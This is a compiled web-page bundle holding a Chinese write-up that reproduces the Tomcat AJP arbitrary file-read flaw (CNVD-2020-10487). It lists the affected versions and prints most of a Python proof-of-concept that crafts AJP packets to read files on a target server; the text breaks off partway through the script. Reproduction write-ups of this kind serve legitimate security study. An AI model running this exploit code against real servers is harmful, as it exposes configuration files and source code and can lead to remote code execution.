import{_ as a,p as t,q as p,s as n,R as s,Z as o}from"./framework-47a2e622.js";const e="/images/微信图片_20220906095400.png",c="/images/微信图片_20220906095858.png",u="/images/微信图片_20220907110405.png",l="/images/微信图片_20220907110638.png",k="/images/微信图片_20220907111342.png",i="/images/微信图片_20220907111415.png",r={},d=n("h2",{id:"漏洞简介",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞简介","aria-hidden":"true"},"#"),s(" 漏洞简介")],-1),_=n("p",null,"由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。",-1),m=n("div",{class:"custom-container info"},[n("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[n("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[n("circle",{cx:"12",cy:"12",r:"9"}),n("path",{d:"M12 8h.01"}),n("path",{d:"M11 12h1v4h1"})])]),n("p",{class:"custom-container-title"},"影响版本"),n("ul",{class:"contains-task-list"},[n("li",{class:"task-list-item"},[n("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),s(" Apache Tomcat 6")]),n("li",{class:"task-list-item"},[n("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),s(" Apache Tomcat 7 < 7.0.100")]),n("li",{class:"task-list-item"},[n("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),s(" Apache Tomcat 8 < 8.5.51")]),n("li",{class:"task-list-item"},[n("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),s(" Apache Tomcat 9 < 9.0.31")])])],-1),g=o('<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>使用 docker 搭建环境：</p><p><img src="'+e+`" alt=""></p><p>使用脚本检测：</p><details class="custom-container details"><summary class="custom-container-title">POC</summary><div class="language-python" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment">#CNVD-2020-10487  Tomcat-Ajp lfi</span>
<span class="token comment">#by ydhcui</span>
<span class="token keyword">import</span> struct

<span class="token comment"># Some references:</span>
<span class="token comment"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span>
<span class="token keyword">def</span> <span class="token function">pack_string</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span> s <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;h&quot;</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
	l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
	<span class="token keyword">return</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;H%dsb&quot;</span> <span class="token operator">%</span> l<span class="token punctuation">,</span> l<span class="token punctuation">,</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">unpack</span><span class="token punctuation">(</span>stream<span class="token punctuation">,</span> fmt<span class="token punctuation">)</span><span class="token punctuation">:</span>
	size <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>fmt<span class="token punctuation">)</span>
	buf <span class="token operator">=</span> stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span>size<span class="token punctuation">)</span>
	<span class="token keyword">return</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span>fmt<span class="token punctuation">,</span> buf<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">unpack_string</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
	size<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;h&quot;</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment"># null string</span>
		<span class="token keyword">return</span> <span class="token boolean">None</span>
	res<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;%ds&quot;</span> <span class="token operator">%</span> size<span class="token punctuation">)</span>
	stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># \\0</span>
	<span class="token keyword">return</span> res
<span class="token keyword">class</span> <span class="token class-name">NotFoundException</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">pass</span>
<span class="token keyword">class</span> <span class="token class-name">AjpBodyRequest</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token comment"># server == web server, container == servlet</span>
	SERVER_TO_CONTAINER<span class="token punctuation">,</span> CONTAINER_TO_SERVER <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
	MAX_REQUEST_LENGTH <span class="token operator">=</span> <span class="token number">8186</span>
	<span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data_stream<span class="token punctuation">,</span> data_len<span class="token punctuation">,</span> data_direction<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>data_stream <span class="token operator">=</span> data_stream
		self<span class="token punctuation">.</span>data_len <span class="token operator">=</span> data_len
		self<span class="token punctuation">.</span>data_direction <span class="token operator">=</span> data_direction
	<span class="token keyword">def</span> <span class="token function">serialize</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
		data <span class="token operator">=</span> self<span class="token punctuation">.</span>data_stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span>AjpBodyRequest<span class="token punctuation">.</span>MAX_REQUEST_LENGTH<span class="token punctuation">)</span>
		<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;bbH&quot;</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">)</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			res <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
			res <span class="token operator">+=</span> data
		<span class="token keyword">if</span> self<span class="token punctuation">.</span>data_direction <span class="token operator">==</span> AjpBodyRequest<span class="token punctuation">.</span>SERVER_TO_CONTAINER<span class="token punctuation">:</span>
			header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;bbH&quot;</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;bbH&quot;</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> header <span class="token operator">+</span> res
	<span class="token keyword">def</span> <span class="token function">send_and_receive</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> socket<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
			data <span class="token operator">=</span> self<span class="token punctuation">.</span>serialize<span class="token punctuation">(</span><span class="token punctuation">)</span>
			socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
			r <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
			<span class="token keyword">while</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">!=</span> AjpResponse<span class="token punctuation">.</span>GET_BODY_CHUNK <span class="token keyword">and</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">!=</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERS<span class="token punctuation">:</span>
				r <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>

			<span class="token keyword">if</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERS <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
				<span class="token keyword">break</span>
<span class="token keyword">class</span> <span class="token class-name">AjpForwardRequest</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	_<span class="token punctuation">,</span> OPTIONS<span class="token punctuation">,</span> GET<span class="token punctuation">,</span> HEAD<span class="token punctuation">,</span> POST<span class="token punctuation">,</span> PUT<span class="token punctuation">,</span> DELETE<span class="token punctuation">,</span> TRACE<span class="token punctuation">,</span> PROPFIND<span class="token punctuation">,</span> PROPPATCH<span class="token punctuation">,</span> MKCOL<span class="token punctuation">,</span> COPY<span class="token punctuation">,</span> MOVE<span class="token punctuation">,</span> LOCK<span class="token punctuation">,</span> UNLOCK<span class="token punctuation">,</span> ACL<span class="token punctuation">,</span> REPORT<span class="token punctuation">,</span> VERSION_CONTROL<span class="token punctuation">,</span> CHECKIN<span class="token punctuation">,</span> CHECKOUT<span class="token punctuation">,</span> UNCHECKOUT<span class="token punctuation">,</span> SEARCH<span class="token punctuation">,</span> MKWORKSPACE<span class="token punctuation">,</span> UPDATE<span class="token punctuation">,</span> LABEL<span class="token punctuation">,</span> MERGE<span class="token punctuation">,</span> BASELINE_CONTROL<span class="token punctuation">,</span> MKACTIVITY <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span>
	REQUEST_METHODS <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">:</span> GET<span class="token punctuation">,</span> <span class="token string">&#39;POST&#39;</span><span class="token punctuation">:</span> POST<span class="token punctuation">,</span> <span class="token string">&#39;HEAD&#39;</span><span class="token punctuation">:</span> HEAD<span class="token punctuation">,</span> <span class="token string">&#39;OPTIONS&#39;</span><span class="token punctuation">:</span> OPTIONS<span class="token punctuation">,</span> <span class="token string">&#39;PUT&#39;</span><span class="token punctuation">:</span> PUT<span class="token punctuation">,</span> <span class="token string">&#39;DELETE&#39;</span><span class="token punctuation">:</span> DELETE<span class="token punctuation">,</span> <span class="token string">&#39;TRACE&#39;</span><span class="token punctuation">:</span> TRACE<span class="token punctuation">}</span>
	<span class="token comment"># server == web server, container == servlet</span>
	SERVER_TO_CONTAINER<span class="token punctuation">,</span> CONTAINER_TO_SERVER <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
	COMMON_HEADERS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;SC_REQ_ACCEPT&quot;</span><span class="token punctuation">,</span>
		<span class="token string">&quot;SC_REQ_ACCEPT_CHARSET&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_ACCEPT_ENCODING&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_ACCEPT_LANGUAGE&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_AUTHORIZATION&quot;</span><span class="token punctuation">,</span>
		<span class="token string">&quot;SC_REQ_CONNECTION&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_CONTENT_TYPE&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_COOKIE&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_COOKIE2&quot;</span><span class="token punctuation">,</span>
		<span class="token string">&quot;SC_REQ_HOST&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_PRAGMA&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_REFERER&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_USER_AGENT&quot;</span>
	<span class="token punctuation">]</span>
	ATTRIBUTES <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;context&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;servlet_path&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;remote_user&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;auth_type&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;query_string&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;route&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;ssl_cert&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;ssl_cipher&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;ssl_session&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;req_attribute&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;ssl_key_size&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;secret&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;stored_method&quot;</span><span class="token punctuation">]</span>
	<span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data_direction<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>prefix_code <span class="token operator">=</span> <span class="token number">0x02</span>
		self<span class="token punctuation">.</span>method <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>protocol <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>remote_addr <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>remote_host <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>server_name <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>server_port <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>is_ssl <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>num_headers <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>request_headers <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>attributes <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>data_direction <span class="token operator">=</span> data_direction
	<span class="token keyword">def</span> <span class="token function">pack_headers</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>num_headers <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>request_headers<span class="token punctuation">)</span>
		res <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
		res <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;h&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>num_headers<span class="token punctuation">)</span>
		<span class="token keyword">for</span> h_name <span class="token keyword">in</span> self<span class="token punctuation">.</span>request_headers<span class="token punctuation">:</span>
			<span class="token keyword">if</span> h_name<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">&quot;SC_REQ&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
				code <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">.</span>COMMON_HEADERS<span class="token punctuation">.</span>index<span class="token punctuation">(</span>h_name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
				res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;BB&quot;</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>h_name<span class="token punctuation">)</span>

			res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>request_headers<span class="token punctuation">[</span>h_name<span class="token punctuation">]</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> res

	<span class="token keyword">def</span> <span class="token function">pack_attributes</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
		res <span class="token operator">=</span> <span class="token string">b&quot;&quot;</span>
		<span class="token keyword">for</span> attr <span class="token keyword">in</span> self<span class="token punctuation">.</span>attributes<span class="token punctuation">:</span>
			a_name <span class="token operator">=</span> attr<span class="token punctuation">[</span><span class="token string">&#39;name&#39;</span><span class="token punctuation">]</span>
			code <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">.</span>ATTRIBUTES<span class="token punctuation">.</span>index<span class="token punctuation">(</span>a_name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
			res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;b&quot;</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span>
			<span class="token keyword">if</span> a_name <span class="token operator">==</span> <span class="token string">&quot;req_attribute&quot;</span><span class="token punctuation">:</span>
				aa_name<span class="token punctuation">,</span> a_value <span class="token operator">=</span> attr<span class="token punctuation">[</span><span class="token string">&#39;value&#39;</span><span class="token punctuation">]</span>
				res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>aa_name<span class="token punctuation">)</span>
				res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>a_value<span class="token punctuation">)</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>attr<span class="token punctuation">[</span><span class="token string">&#39;value&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
		res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;B&quot;</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> res
	<span class="token keyword">def</span> <span class="token function">serialize</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
		res <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
		res <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;bb&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>prefix_code<span class="token punctuation">,</span> self<span class="token punctuation">.</span>method<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>protocol<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>req_uri<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>remote_addr<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>remote_host<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>server_name<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;h&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>server_port<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;?&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>is_ssl<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> self<span class="token punctuation">.</span>pack_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
		res <span class="token operator">+=</span> self<span class="token punctuation">.</span>pack_attributes<span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> self<span class="token punctuation">.</span>data_direction <span class="token operator">==</span> AjpForwardRequest<span class="token punctuation">.</span>SERVER_TO_CONTAINER<span class="token punctuation">:</span>
			header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;bbh&quot;</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;bbh&quot;</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> header <span class="token operator">+</span> res
	<span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raw_packet<span class="token punctuation">)</span><span class="token punctuation">:</span>
		stream <span class="token operator">=</span> StringIO<span class="token punctuation">(</span>raw_packet<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>magic1<span class="token punctuation">,</span> self<span class="token punctuation">.</span>magic2<span class="token punctuation">,</span> data_len <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;bbH&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>prefix_code<span class="token punctuation">,</span> self<span class="token punctuation">.</span>method <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;bb&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>protocol <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>remote_addr <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>remote_host <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>server_name <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>server_port <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;h&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>is_ssl <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;?&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>num_headers<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>request_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
		<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>num_headers<span class="token punctuation">)</span><span class="token punctuation">:</span>
			code<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">)</span>
			<span class="token keyword">if</span> code <span class="token operator">&gt;</span> <span class="token number">0xA000</span><span class="token punctuation">:</span>
				h_name <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">.</span>COMMON_HEADERS<span class="token punctuation">[</span>code <span class="token operator">-</span> <span class="token number">0xA001</span><span class="token punctuation">]</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				h_name <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;%ds&quot;</span> <span class="token operator">%</span> code<span class="token punctuation">)</span>
				stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># \\0</span>
			h_value <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
			self<span class="token punctuation">.</span>request_headers<span class="token punctuation">[</span>h_name<span class="token punctuation">]</span> <span class="token operator">=</span> h_value
	<span class="token keyword">def</span> <span class="token function">send_and_receive</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> socket<span class="token punctuation">,</span> stream<span class="token punctuation">,</span> save_cookies<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
		i <span class="token operator">=</span> socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>self<span class="token punctuation">.</span>serialize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> self<span class="token punctuation">.</span>method <span class="token operator">==</span> AjpForwardRequest<span class="token punctuation">.</span>POST<span class="token punctuation">:</span>
			<span class="token keyword">return</span> res

		r <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		<span class="token keyword">assert</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERS
		res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
		<span class="token keyword">if</span> save_cookies <span class="token keyword">and</span> <span class="token string">&#39;Set-Cookie&#39;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>response_headers<span class="token punctuation">:</span>
			self<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">&#39;SC_REQ_COOKIE&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">.</span>response_headers<span class="token punctuation">[</span><span class="token string">&#39;Set-Cookie&#39;</span><span class="token punctuation">]</span>

		<span class="token comment"># read body chunks and end response packets</span>
		<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
			r <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
			res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
			<span class="token keyword">if</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>END_RESPONSE<span class="token punctuation">:</span>
				<span class="token keyword">break</span>
			<span class="token keyword">elif</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_BODY_CHUNK<span class="token punctuation">:</span>
				<span class="token keyword">continue</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				<span class="token keyword">raise</span> NotImplementedError
				<span class="token keyword">break</span>

		<span class="token keyword">return</span> res

<span class="token keyword">class</span> <span class="token class-name">AjpResponse</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	_<span class="token punctuation">,</span>_<span class="token punctuation">,</span>_<span class="token punctuation">,</span>SEND_BODY_CHUNK<span class="token punctuation">,</span> SEND_HEADERS<span class="token punctuation">,</span> END_RESPONSE<span class="token punctuation">,</span> GET_BODY_CHUNK <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
	COMMON_SEND_HEADERS <span class="token operator">=</span> <span class="token punctuation">[</span>
